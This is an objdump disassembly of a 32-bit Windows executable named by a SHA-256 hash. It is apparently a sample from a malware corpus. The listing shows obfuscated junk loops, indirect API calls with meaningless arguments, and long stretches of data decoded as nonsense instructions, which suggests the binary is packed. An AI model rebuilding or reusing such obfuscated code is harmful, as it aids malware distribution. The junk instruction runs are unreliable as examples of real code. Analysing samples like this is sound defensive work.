
de5aa75e1fe73d1b9e9823610ed55c4308991cf0a1b4f33457a2425b74361c04.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ebx+0x7ebee187],al
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [edi+0x0],bl
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x6d6cb739
  40126d:	cmp    ah,dh
  40126f:	add    BYTE PTR [esi-0x8],dl
  401272:	pop    ss
  401273:	xchg   ebx,eax
  401274:	in     al,0xe5
  401276:	jb     0x4012bf
  401278:	repnz aad 0x7e
  40127b:	ret    0x72b0
  40127e:	pop    ebp
  40127f:	adc    DWORD PTR [esi+0x18],ebx
  401282:	pop    ecx
  401283:	nop
  401284:	pop    ebp
  401285:	xchg   edx,eax
  401286:	add    eax,0x3f452f8e
  40128b:	aad    0xd7
  40128d:	popa   
  40128e:	(bad)  
  40128f:	pop    ecx
  401290:	or     dl,bh
  401292:	push   esp
  401293:	daa    
  401294:	mov    esi,0xc775de29
  401299:	fdiv   QWORD PTR [ecx+0x58337bee]
  40129f:	mov    edi,0xdb0b92a6
  4012a4:	and    bh,ah
  4012a6:	and    edi,ebx
  4012a8:	stc    
  4012a9:	into   
  4012aa:	dec    esi
  4012ab:	imul   eax,DWORD PTR [esi+edi*4+0x71],0x56
  4012b0:	es cmc 
  4012b2:	sbb    DWORD PTR [eax],ebx
  4012b4:	out    dx,eax
  4012b5:	scas   eax,DWORD PTR es:[edi]
  4012b6:	add    ecx,DWORD PTR [ebx+ecx*8-0x4f]
  4012ba:	pop    ebx
  4012bb:	mov    dl,BYTE PTR [esi+0x7916ccea]
  4012c1:	cli    
  4012c2:	out    0x80,eax
  4012c4:	mov    esp,0x6cee846a
  4012c9:	sub    BYTE PTR [ebx+edx*8+0x3],dl
  4012cd:	inc    ebx
  4012ce:	adc    BYTE PTR [edi+0x9],cl
  4012d1:	mov    ecx,0x70e333
  4012d6:	(bad)  
  4012d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012d8:	mov    eax,ds:0x7c885199
  4012dd:	sub    eax,0x1d04f6b7
  4012e2:	inc    eax
  4012e3:	out    dx,eax
  4012e4:	sub    dh,0x57
  4012e7:	push   edx
  4012e8:	out    dx,al
  4012e9:	call   0xa15c0555
  4012ee:	xor    DWORD PTR [eax],eax
  4012f0:	outs   dx,BYTE PTR ds:[esi]
  4012f1:	aaa    
  4012f2:	push   esi
  4012f3:	lahf   
  4012f4:	aad    0x9b
  4012f6:	mov    edi,DWORD PTR [ebp-0x4d9ea434]
  4012fc:	call   0xbb8ded72
  401301:	(bad)  
  401303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401304:	test   BYTE PTR [ebx+0x6ee8bfd4],al
  40130a:	rol    BYTE PTR [eax],1
  40130c:	(bad)  
  40130d:	xchg   ecx,eax
  40130e:	fstp   QWORD PTR [ecx]
  401310:	pop    esp
  401311:	mov    al,0xb6
  401313:	rcl    BYTE PTR [edx+0x46],0xf6
  401317:	jp     0x40132f
  401319:	mov    bl,0x4a
  40131b:	cmp    ebp,DWORD PTR [ecx]
  40131d:	leave  
  40131e:	push   ecx
  40131f:	jmp    0x842dce84
  401324:	lock mov bl,0x92
  401327:	out    dx,al
  401328:	mov    dh,0xff
  40132a:	inc    edi
  40132b:	push   edi
  40132c:	ins    BYTE PTR es:[edi],dx
  40132d:	add    eax,DWORD PTR [ecx+edx*4]
  401330:	and    edx,DWORD PTR [esp+eax*8+0x7a322239]
  401337:	add    al,0x3b
  401339:	fiadd  WORD PTR [eax+0xb]
  40133c:	push   eax
  40133d:	push   eax
  40133e:	add    esi,DWORD PTR [edx-0x4346ab80]
  401344:	jno    0x4013a0
  401346:	std    
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433753,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	and    eax,0xfa5b5623
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013ff
  4013c0:	mov    al,BYTE PTR [ecx+esi*8]
  4013c3:	aaa    
  4013c4:	es jne 0x401405
  4013c7:	int    0x87
  4013c9:	dec    esp
  4013ca:	arpl   WORD PTR [ebx-0x3ce223b],ax
  4013d0:	leave  
  4013d1:	pop    ds
  4013d2:	fimul  DWORD PTR [ecx+0x72]
  4013d5:	mov    ds:0x342ef48c,eax
  4013da:	adc    BYTE PTR [esi+0x3f],bl
  4013dd:	mov    bh,0x5
  4013df:	mov    edi,DWORD PTR [ebx+0x32ec50b4]
  4013e5:	pop    ebp
  4013e6:	push   0x27
  4013e8:	(bad)  
  4013e9:	clc    
  4013ea:	jb     0x4013ae
  4013ec:	stc    
  4013ed:	rcr    DWORD PTR [ebp+0x2c],1
  4013f0:	mov    ah,0x1b
  4013f2:	sub    esi,ecx
  4013f4:	adc    ah,BYTE PTR [ebx]
  4013f6:	inc    edx
  4013f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f8:	jle    0x401445
  4013fa:	sbb    BYTE PTR [eax+0x36],bh
  4013fd:	test   BYTE PTR [edi+0x41],dh
  401400:	fsub   st,st(2)
  401402:	mov    ds:0x17ac4c64,al
  401407:	and    al,0xfb
  401409:	dec    esp
  40140a:	inc    ecx
  40140b:	xor    ch,BYTE PTR [esi-0x33]
  40140e:	hlt    
  40140f:	inc    eax
  401410:	xor    al,0xae
  401412:	outs   dx,BYTE PTR ds:[esi]
  401413:	push   ds
  401414:	jo     0x4013af
  401416:	ins    BYTE PTR es:[edi],dx
  401417:	ins    DWORD PTR es:[edi],dx
  401418:	cmp    BYTE PTR [ecx-0x13],0x79
  40141c:	xor    ch,ah
  40141e:	pusha  
  40141f:	or     al,0xd7
  401421:	cmp    al,0xac
  401423:	mov    BYTE PTR [ecx-0x27ee53a0],cl
  401429:	mov    ebx,0x8521bf42
  40142e:	fwait
  40142f:	inc    eax
  401430:	mov    eax,ds:0x1a69bce8
  401435:	or     ebp,edx
  401437:	mov    eax,0x7dc0265a
  40143c:	sbb    BYTE PTR [ebx+0x69],0xa0
  401440:	retf   
  401441:	les    ebp,FWORD PTR [ebx]
  401443:	rcl    DWORD PTR gs:[edi-0x26],cl
  401447:	jle    0x4013d1
  401449:	mov    ch,0x13
  40144b:	retf   0xa765
  40144e:	pop    ecx
  40144f:	jp     0x4013e9
  401451:	dec    edx
  401452:	push   cs
  401453:	ficom  WORD PTR [edx]
  401455:	cmp    al,0x1f
  401457:	cld    
  401458:	jb     0x40148c
  40145a:	stos   DWORD PTR es:[edi],eax
  40145b:	cs pop ebx
  40145d:	repz xor ecx,0xffffffec
  401461:	jmp    ebx
  401463:	in     al,0x53
  401465:	repz push edi
  401467:	and    al,0x92
  401469:	xor    dl,BYTE PTR [edi-0x70]
  40146c:	push   cs
  40146d:	adc    ebx,DWORD PTR [ebx]
  40146f:	cmp    eax,0xc814839e
  401474:	cs fwait
  401476:	(bad)  
  401477:	out    0xe2,al
  401479:	das    
  40147a:	fwait
  40147b:	push   esi
  40147c:	or     ebp,DWORD PTR [ebp-0x7d324647]
  401482:	rol    DWORD PTR [edi],0xeb
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	dec    ecx
  401487:	mov    al,0x69
  401489:	xor    DWORD PTR [ebp-0x3433bc7b],ebp
  40148f:	xor    eax,0xffffffd8
  401492:	stos   DWORD PTR es:[edi],eax
  401493:	push   es
  401494:	(bad)  
  401495:	xor    bl,BYTE PTR [edx]
  401497:	clc    
  401498:	or     bl,bl
  40149a:	sbb    eax,DWORD PTR [edx]
  40149c:	out    dx,al
  40149d:	jmp    0x893a8066
  4014a2:	cwde   
  4014a3:	push   cs
  4014a4:	add    BYTE PTR [ecx-0x23640f81],bh
  4014aa:	dec    ebp
  4014ab:	cmp    DWORD PTR [ecx],0x2e398f03
  4014b1:	(bad)  
  4014b2:	dec    esi
  4014b3:	mov    dh,0x40
  4014b5:	aad    0xcd
  4014b7:	pop    esi
  4014b8:	(bad)  
  4014b9:	data16 and BYTE PTR [ecx],dl
  4014bc:	iret   
  4014bd:	lea    ebp,[ebp+0x22]
  4014c0:	stc    
  4014c1:	sbb    BYTE PTR [ebp-0xa],dh
  4014c4:	inc    eax
  4014c5:	mov    dh,0xa7
  4014c7:	sahf   
  4014c8:	push   ds
  4014c9:	mov    DWORD PTR [eax-0x4941c410],esi
  4014cf:	xor    ch,BYTE PTR [ecx-0x56]
  4014d2:	shl    eax,1
  4014d4:	xchg   esi,eax
  4014d5:	cmp    eax,0x1abd1967
  4014da:	xor    bl,BYTE PTR [ecx]
  4014dc:	(bad)  
  4014dd:	mov    al,0xf1
  4014df:	jns    0x401547
  4014e1:	shr    BYTE PTR [edi],cl
  4014e3:	call   0x909bb9db
  4014e8:	aaa    
  4014e9:	or     eax,0xb8bbfd4f
  4014ee:	sub    al,0x50
  4014f0:	dec    eax
  4014f1:	sahf   
  4014f2:	pop    ecx
  4014f3:	mov    ch,0x3b
  4014f5:	and    BYTE PTR [ebx],bl
  4014f7:	sbb    eax,ecx
  4014f9:	jmp    0xe027:0xb04c101c
  401500:	jmp    0xc71f:0x28702a9e
  401507:	push   edi
  401508:	xor    eax,0xa61efcd8
  40150d:	cmp    DWORD PTR [ebx+0xc380969],edx
  401513:	mov    BYTE PTR [edi-0x5b],0xd9
  401517:	pushf  
  401518:	jae    0x40153b
  40151a:	mov    ebp,0x947aa475
  40151f:	add    al,bl
  401521:	inc    ebp
  401522:	sbb    dh,BYTE PTR [eax]
  401524:	jns    0x401538
  401526:	add    al,0xc3
  401528:	jbe    0x4014d5
  40152a:	mov    dh,0x89
  40152c:	or     ebx,DWORD PTR [eax+0x4e]
  40152f:	pop    esi
  401530:	sub    DWORD PTR [esi+eax*4-0xc0b2cc2],ecx
  401537:	mov    bh,bh
  401539:	jecxz  0x4014eb
  40153b:	aad    0xde
  40153d:	aas    
  40153e:	shl    ecx,0xbd
  401541:	sub    bl,BYTE PTR [ecx+0x31c4458b]
  401547:	sbb    eax,0x43370f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x71cdfd1d]
  401564:	jmp    0x7ffa:0x7e7e7d06
  40156b:	jle    0x4015eb
  40156d:	and    al,0x2f
  40156f:	repz mov esp,0xcf597f19
  401575:	repz hlt 
  401577:	outs   dx,DWORD PTR ds:[esi]
  401578:	aam    0x4c
  40157a:	sbb    eax,esi
  40157c:	pop    es
  40157d:	nop
  40157e:	push   0x7c54ced3
  401583:	jge    0x401542
  401585:	pop    esp
  401586:	mov    ds:0xf00fe053,eax
  40158b:	sbb    al,0x3
  40158d:	test   DWORD PTR [ecx],esp
  40158f:	lods   al,BYTE PTR ds:[esi]
  401590:	xchg   edi,eax
  401591:	mov    edi,0x98687495
  401596:	and    eax,0x39edb65e
  40159b:	sub    eax,DWORD PTR [edi+0x24]
  40159e:	pop    eax
  40159f:	jo     0x4015f4
  4015a1:	jg     0x40158d
  4015a3:	jne    0x401534
  4015a5:	fidiv  DWORD PTR [edx+0x50061fab]
  4015ab:	sbb    DWORD PTR [eax],0x3b
  4015ae:	bound  esi,QWORD PTR [eax-0x3f6dc9e1]
  4015b4:	sbb    ecx,esp
  4015b6:	rcr    DWORD PTR [ebp+0x37ea7928],0xa1
  4015bd:	mov    ebx,0x8cad59b
  4015c2:	orps   xmm2,XMMWORD PTR [edx+0x4e05443a]
  4015c9:	jle    0x401648
  4015cb:	mov    ecx,0xc3e2e3a3
  4015d0:	jbe    0x401634
  4015d2:	test   BYTE PTR [eax-0x28eef9e7],cl
  4015d8:	sbb    eax,0xf4d86c78
  4015dd:	mov    esp,0x5314ff44
  4015e2:	add    BYTE PTR [edx],0x98
  4015e5:	add    BYTE PTR [ecx],0xc9
  4015e8:	adc    bh,BYTE PTR [eax]
  4015ea:	sub    dl,BYTE PTR es:[ebx+0x65f0383f]
  4015f1:	dec    esi
  4015f2:	imul   ebp,ecx,0x9fa5c7c9
  4015f8:	aaa    
  4015f9:	dec    edx
  4015fa:	sub    esp,ecx
  4015fc:	pop    eax
  4015fd:	cs test eax,0xb5d4a479
  401603:	mov    eax,0xa2c90fe6
  401608:	pushf  
  401609:	std    
  40160a:	in     al,dx
  40160b:	sub    eax,0xffa2b4db
  401610:	jecxz  0x401688
  401612:	pop    es
  401613:	push   esp
  401614:	push   ebp
  401615:	icebp  
  401616:	pop    edx
  401617:	or     eax,0xc199d4ad
  40161c:	jbe    0x401696
  40161e:	sub    al,0x9b
  401620:	adc    eax,DWORD PTR [esi+0x2cdd14f]
  401626:	fdiv   DWORD PTR [ebp+edx*8+0x6cbb6424]
  40162d:	add    cl,BYTE PTR [ebx+0x3a]
  401630:	push   edx
  401631:	jb     0x401678
  401633:	inc    esi
  401634:	add    eax,0xaef10638
  401639:	retf   0x2c7d
  40163c:	pushf  
  40163d:	xlat   BYTE PTR ds:[ebx]
  40163e:	xor    eax,0x60016fe9
  401644:	dec    ecx
  401645:	lahf   
  401646:	outs   dx,BYTE PTR ds:[esi]
  401647:	jns    0x401651
  401649:	in     al,0x9f
  40164b:	ror    DWORD PTR [edx],cl
  40164d:	jp     0x401656
  40164f:	dec    edx
  401650:	xchg   edi,eax
  401651:	into   
  401652:	push   edi
  401653:	or     dl,BYTE PTR [edx]
  401655:	jo     0x401682
  401657:	sar    DWORD PTR [eax],1
  401659:	int    0x74
  40165b:	fadd   QWORD PTR [ebp-0x65]
  40165e:	int3   
  40165f:	fdivr  st(6),st
  401661:	enter  0x60b,0xc2
  401665:	inc    BYTE PTR ds:0xd8091a76
  40166b:	adc    BYTE PTR [esi+edi*4],ch
  40166e:	jmp    0xf16e2a7a
  401673:	retf   0x3750
  401676:	(bad)  
  401677:	out    0x5,al
  401679:	and    ah,BYTE PTR [ebx+0x5619a654]
  40167f:	iret   
  401680:	push   es
  401681:	fisttp WORD PTR [ebx-0x29]
  401684:	pop    ds
  401685:	arpl   bp,dx
  401687:	jne    0x40168f
  401689:	pop    esi
  40168a:	sbb    ebp,DWORD PTR [ebx+0x39e3ce4d]
  401690:	inc    ebx
  401691:	or     eax,0xcbe25d6c
  401696:	test   ch,al
  401698:	pop    eax
  401699:	mov    edi,0xfd21524d
  40169e:	or     BYTE PTR [eax],bl
  4016a0:	dec    esi
  4016a1:	sbb    al,0x39
  4016a3:	fidivr DWORD PTR [ebx]
  4016a5:	cmp    eax,0x92d5c0bf
  4016aa:	lods   eax,DWORD PTR ds:[esi]
  4016ab:	xor    edx,DWORD PTR [esi+0x602aeeed]
  4016b1:	(bad)  
  4016b2:	cld    
  4016b3:	pop    eax
  4016b4:	or     ah,BYTE PTR [eax-0x6a]
  4016b7:	mov    esi,0x6e2fa791
  4016bc:	mov    DWORD PTR [eax],ecx
  4016be:	xor    al,0x90
  4016c0:	xlat   BYTE PTR ds:[ebx]
  4016c1:	mov    ch,0x99
  4016c3:	mov    cl,0x19
  4016c5:	xchg   esi,eax
  4016c6:	retf   0x8174
  4016c9:	or     al,0x5c
  4016cb:	and    DWORD PTR [esp+edi*8-0x281717f1],0x46
  4016d3:	test   esi,0xa9bfb03b
  4016d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016da:	sub    DWORD PTR [esi+0x7926cb11],eax
  4016e0:	fisubr DWORD PTR [edx-0x50]
  4016e3:	xor    al,0x31
  4016e5:	test   al,0x2e
  4016e7:	jns    0x401749
  4016e9:	pop    ss
  4016ea:	pop    ebp
  4016eb:	cli    
  4016ec:	fadd   QWORD PTR [edi+0x44]
  4016ef:	in     eax,dx
  4016f0:	mov    edi,0x4589c703
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x714e6ade
  4018e9:	push   0x7e7a8282
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018fe
  4018f4:	adc    BYTE PTR [edx*4-0x20c003d0],dl
  4018fb:	pop    eax
  4018fc:	lock arpl WORD PTR [edx-0x7085ae18],bx
  401903:	ret    0x887c
  401906:	scas   al,BYTE PTR es:[edi]
  401907:	fdiv   QWORD PTR [edi-0x5a4fd199]
  40190d:	das    
  40190e:	dec    esp
  40190f:	pop    ebx
  401910:	jo     0x40197e
  401912:	or     DWORD PTR [edi+0x6c],edi
  401915:	add    edx,ebx
  401917:	gs pop edx
  401919:	pop    ss
  40191a:	dec    ebp
  40191b:	add    edi,DWORD PTR [eax+0x46a03e83]
  401921:	out    dx,al
  401922:	fdiv   QWORD PTR [edi-0x78c3ddae]
  401928:	sub    edi,DWORD PTR [eax-0x32]
  40192b:	mov    bh,0x20
  40192d:	je     0x4018d9
  40192f:	gs jl  0x401989
  401932:	ja     0x4018e6
  401934:	hlt    
  401935:	out    0x36,eax
  401937:	les    ebx,FWORD PTR [eax]
  401939:	fwait
  40193a:	retf   
  40193b:	xor    ebp,edi
  40193d:	add    BYTE PTR [eax],0xc8
  401940:	sbb    DWORD PTR [ebp-0x29],0x6d
  401944:	stos   BYTE PTR es:[edi],al
  401945:	ud0    edx,DWORD PTR [edi]
  401948:	(bad)  
  401949:	xlat   BYTE PTR ds:[ebx]
  40194a:	data16 or BYTE PTR [ecx+0x3],ah
  40194e:	push   esp
  40194f:	scas   eax,DWORD PTR es:[edi]
  401950:	mov    ebp,0x9050e22d
  401955:	xchg   edi,eax
  401956:	push   ecx
  401957:	mov    bh,0x9d
  401959:	stc    
  40195a:	pop    ds
  40195b:	push   cs
  40195c:	pop    ss
  40195d:	lock (bad) 
  401960:	pusha  
  401961:	retf   
  401962:	pop    esi
  401963:	fild   QWORD PTR [ebp-0x22754506]
  401969:	mov    DWORD PTR [ecx-0x77],eax
  40196c:	and    BYTE PTR [eax-0xb],bh
  40196f:	inc    eax
  401970:	lods   eax,DWORD PTR ds:[esi]
  401971:	dec    esi
  401972:	jmp    0x1581d212
  401977:	hlt    
  401978:	jmp    0x89df:0x64bc7ab2
  40197f:	clc    
  401980:	xor    eax,0x8cc1b612
  401985:	adc    BYTE PTR ds:0x5a4316ea,ch
  40198b:	in     al,0xef
  40198d:	cmp    BYTE PTR [eax],0x7d
  401990:	hlt    
